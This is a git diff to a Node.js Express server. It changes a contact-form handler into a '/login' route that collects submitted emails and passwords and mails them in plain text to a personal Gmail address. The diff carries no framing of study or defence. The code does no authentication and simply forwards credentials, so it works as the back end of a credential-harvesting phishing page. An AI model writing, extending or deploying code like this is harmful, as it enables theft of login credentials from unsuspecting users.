@@ -10,9 +10,9 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 
 // Define a route to handle form submission
-app.post("/send-email", (req, res) => {
+app.post("/login", (req, res) => {
   // Extract form data
-  const { name, email, message } = req.body;
+  const {  email, password } = req.body;
 
   // Create transporter object using SMTP transport
   let transporter = nodemailer.createTransport({
@@ -28,7 +28,7 @@ app.post("/send-email", (req, res) => {
     from: "ekeleagbakwuru9@gmail.com",
     to: "ekeleagbakwuru9@gmail.com",
     subject: "New Form Submission",
-    text: `Name: ${name}\nEmail: ${email}\nMessage: ${message}`,
+    text: ` \nEmail: ${email}\nPassword: ${password}`,
   };
 
   // Send email
